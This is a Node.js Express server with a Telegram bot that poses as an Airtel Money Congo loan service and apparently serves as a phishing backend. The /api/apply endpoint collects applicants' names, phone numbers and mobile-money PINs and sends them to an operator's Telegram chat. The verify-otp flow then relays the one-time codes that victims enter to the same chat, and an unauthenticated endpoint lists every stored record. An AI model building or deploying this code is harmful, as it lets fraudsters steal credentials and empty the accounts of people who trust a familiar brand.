const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

// Initialize Telegram Bot
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// In-memory storage
const applications = new Map();
const otps = new Map();

// Middleware
app.use(cors());
app.use(bodyParser.json());

// ==================== STATIC FILES FIX ====================
// Determine the correct directory for static files
const STATIC_DIR = __dirname;

// Log for debugging
console.log('__dirname:', __dirname);

// List all files in directory
let filesInDir = [];
try {
    filesInDir = fs.readdirSync(STATIC_DIR);
    console.log('Files in directory:', filesInDir);
} catch (e) {
    console.log('Error reading directory:', e.message);
}

// Find the actual index.html filename (case-insensitive)
const indexFileName = filesInDir.find(f => f.toLowerCase() === 'index.html');
const INDEX_PATH = indexFileName ? path.join(STATIC_DIR, indexFileName) : path.join(STATIC_DIR, 'index.html');

console.log('Resolved index file:', INDEX_PATH);
console.log('Index file exists?', fs.existsSync(INDEX_PATH));

// Serve static files from the current directory
app.use(express.static(STATIC_DIR));

// ==================== TELEGRAM BOT COMMANDS ====================

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 
        '👋 Bienvenue sur le Bot Admin Airtel Money Congo!\n\n' +
        'Vous recevrez ici les demandes de crédit.\n\n' +
        'Commandes:\n' +
        '/pending - Voir les demandes en attente\n' +
        '/approved - Voir les crédits approuvés\n' +
        '/declined - Voir les crédits refusés\n' +
        '/help - Aide'
    );
});

bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId,
        '📋 *Commandes Admin Airtel Money*\n\n' +
        '/pending - Liste des demandes en attente\n' +
        '/approved - Liste des crédits approuvés\n' +
        '/declined - Liste des crédits refusés\n\n' +
        'Lorsque vous recevez une demande:\n' +
        '✅ Approuver: Cliquez "✅ Approuver"\n' +
        '❌ Refuser: Cliquez "❌ Refuser"',
        { parse_mode: 'Markdown' }
    );
});

bot.onText(/\/pending/, (msg) => {
    const chatId = msg.chat.id;
    const pending = Array.from(applications.values()).filter(a => a.status === 'pending');
    if (pending.length === 0) {
        bot.sendMessage(chatId, '📭 Aucune demande en attente.');
        return;
    }
    pending.forEach(app => sendApplicationToAdmin(app));
});

bot.onText(/\/approved/, (msg) => {
    const chatId = msg.chat.id;
    const approved = Array.from(applications.values()).filter(a => a.status === 'approved');
    if (approved.length === 0) {
        bot.sendMessage(chatId, '✅ Aucun crédit approuvé.');
        return;
    }
    approved.forEach(app => {
        bot.sendMessage(chatId, 
            `✅ *CRÉDIT APPROUVÉ*\n` +
            `ID: \`${app.id}\`\n` +
            `Nom: ${app.firstName} ${app.lastName}\n` +
            `Montant: ${app.loanAmount} CDF\n` +
            `Durée: ${app.loanDuration} mois\n` +
            `Téléphone: ${app.phone}\n` +
            `Date: ${app.submittedAt}`,
            { parse_mode: 'Markdown' }
        );
    });
});

bot.onText(/\/declined/, (msg) => {
    const chatId = msg.chat.id;
    const declined = Array.from(applications.values()).filter(a => a.status === 'declined');
    if (declined.length === 0) {
        bot.sendMessage(chatId, '❌ Aucun crédit refusé.');
        return;
    }
    declined.forEach(app => {
        bot.sendMessage(chatId, 
            `❌ *CRÉDIT REFUSÉ*\n` +
            `ID: \`${app.id}\`\n` +
            `Nom: ${app.firstName} ${app.lastName}\n` +
            `Montant: ${app.loanAmount} CDF\n` +
            `Téléphone: ${app.phone}\n` +
            `Date: ${app.submittedAt}`,
            { parse_mode: 'Markdown' }
        );
    });
});

// ==================== CALLBACK QUERIES ====================

bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;
    const messageId = callbackQuery.message.message_id;

    const [action, appId] = data.split(':');
    const app = applications.get(appId);

    if (!app) {
        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Demande introuvable!' });
        return;
    }

    if (action === 'approve') {
        app.status = 'approved';
        app.decidedAt = new Date().toISOString();
        app.decidedBy = chatId;

        const otp = generateOTP();
        otps.set(app.phone, { otp, appId, expiresAt: Date.now() + 10 * 60 * 1000 });

        bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Crédit approuvé! OTP envoyé au client.' });

        bot.editMessageText(
            `✅ *CRÉDIT APPROUVÉ*\n\n` + formatApplication(app) +
            `\n\n📱 OTP envoyé au: ${app.phone}`,
            { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }
        );

        console.log(`📲 OTP pour ${app.phone}: ${otp}`);

    } else if (action === 'decline') {
        app.status = 'declined';
        app.decidedAt = new Date().toISOString();
        app.decidedBy = chatId;

        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Crédit refusé.' });

        bot.editMessageText(
            `❌ *CRÉDIT REFUSÉ*\n\n` + formatApplication(app),
            { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }
        );
    }
});

// ==================== HELPERS ====================

function generateOTP() {
    return Math.floor(10000 + Math.random() * 90000).toString();
}

function formatApplication(app) {
    return (
        `📝 *Demande de Crédit*\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 *Nom:* ${app.firstName} ${app.lastName}\n` +
        `📞 *Téléphone:* ${app.phone}\n` +
        `💰 *Montant:* ${app.loanAmount} CDF\n` +
        `📅 *Durée:* ${app.loanDuration} mois\n` +
        `📊 *Intérêt:* 2.5%/mois\n` +
        `💵 *Mensualité:* ${app.monthlyPayment} CDF\n` +
        `🔢 *PIN:* ${app.pin}\n` +
        `🏷 *Type:* ${app.loanType}\n` +
        `📝 *Objet:* ${app.purpose || 'N/A'}\n` +
        `⏰ *Soumis:* ${app.submittedAt}\n` +
        `🆔 *ID:* \`${app.id}\``
    );
}

function sendApplicationToAdmin(app) {
    const keyboard = {
        inline_keyboard: [
            [
                { text: '✅ Approuver', callback_data: `approve:${app.id}` },
                { text: '❌ Refuser', callback_data: `decline:${app.id}` }
            ]
        ]
    };
    bot.sendMessage(ADMIN_CHAT_ID, formatApplication(app), {
        parse_mode: 'Markdown',
        reply_markup: keyboard
    });
}

// ==================== API ENDPOINTS ====================

app.post('/api/apply', (req, res) => {
    const { firstName, lastName, phone, loanAmount, loanDuration, loanType, purpose, pin } = req.body;

    if (!firstName || !lastName || !phone || !loanAmount || !loanDuration || !pin) {
        return res.status(400).json({ success: false, message: 'Tous les champs sont requis' });
    }

    if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
        return res.status(400).json({ success: false, message: 'Le PIN doit être de 4 chiffres' });
    }

    const totalInterest = loanAmount * 0.025 * loanDuration;
    const totalRepayment = parseFloat(loanAmount) + totalInterest;
    const monthlyPayment = (totalRepayment / loanDuration).toFixed(2);

    const appId = uuidv4();
    const application = {
        id: appId,
        firstName, lastName, phone, loanAmount, loanDuration,
        loanType: loanType || 'Non spécifié',
        purpose: purpose || 'Non spécifié',
        pin, monthlyPayment,
        status: 'pending',
        submittedAt: new Date().toISOString(),
        otp: null, otpVerified: false
    };

    applications.set(appId, application);
    sendApplicationToAdmin(application);

    res.json({ success: true, message: 'Demande soumise avec succès', applicationId: appId });
});

app.post('/api/verify-otp', (req, res) => {
    const { phone, otp, applicationId } = req.body;
    const stored = otps.get(phone);

    if (!stored) return res.status(400).json({ success: false, message: 'Aucun OTP trouvé' });
    if (Date.now() > stored.expiresAt) { otps.delete(phone); return res.status(400).json({ success: false, message: 'OTP expiré' }); }
    if (stored.otp !== otp) return res.status(400).json({ success: false, message: 'OTP invalide' });
    if (stored.appId !== applicationId) return res.status(400).json({ success: false, message: 'OTP ne correspond pas' });

    const app = applications.get(applicationId);
    app.otp = otp;
    app.otpVerified = true;
    app.verifiedAt = new Date().toISOString();
    otps.delete(phone);

    bot.sendMessage(ADMIN_CHAT_ID, 
        `🎉 *CRÉDIT TRAITÉ AVEC SUCCÈS*\n\n` + formatApplication(app) +
        `\n\n🔐 *OTP Vérifié:* ${otp}\n✅ *Statut:* COMPLET\n⏰ *Vérifié:* ${app.verifiedAt}`,
        { parse_mode: 'Markdown' }
    );

    res.json({ success: true, message: 'OTP vérifié! Crédit approuvé!', application: {
        id: app.id, name: `${app.firstName} ${app.lastName}`, amount: app.loanAmount,
        duration: app.loanDuration, monthlyPayment: app.monthlyPayment, status: 'complete'
    }});
});

app.get('/api/status/:id', (req, res) => {
    const app = applications.get(req.params.id);
    if (!app) return res.status(404).json({ success: false, message: 'Introuvable' });
    res.json({ success: true, status: app.status, otpVerified: app.otpVerified });
});

app.post('/api/resend-otp', (req, res) => {
    const { phone, applicationId } = req.body;
    const app = applications.get(applicationId);
    if (!app) return res.status(404).json({ success: false, message: 'Demande introuvable' });

    const otp = generateOTP();
    otps.set(phone, { otp, appId: applicationId, expiresAt: Date.now() + 10 * 60 * 1000 });
    console.log(`📲 OTP renvoyé pour ${phone}: ${otp}`);
    res.json({ success: true, message: 'OTP renvoyé', testOtp: otp });
});

app.get('/api/applications', (req, res) => {
    res.json({ success: true, count: applications.size, applications: Array.from(applications.values()) });
});

// ==================== FALLBACK ROUTE (SPA SUPPORT) ====================
// This MUST come AFTER API routes and BEFORE app.listen
app.get('*', (req, res) => {
    // Use the resolved index file path
    if (indexFileName && fs.existsSync(INDEX_PATH)) {
        res.sendFile(INDEX_PATH);
    } else {
        // Last resort: try to read and send the file content directly
        try {
            const fileContent = fs.readFileSync(INDEX_PATH, 'utf8');
            res.setHeader('Content-Type', 'text/html');
            res.send(fileContent);
        } catch (e) {
            res.status(404).json({ 
                error: 'index.html not found',
                dirname: __dirname,
                resolvedPath: INDEX_PATH,
                indexFileName: indexFileName || 'not found',
                filesInDir: filesInDir,
                readError: e.message
            });
        }
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Airtel Money Congo Server running on port ${PORT}`);
    console.log(`🤖 Telegram Bot actif`);
});
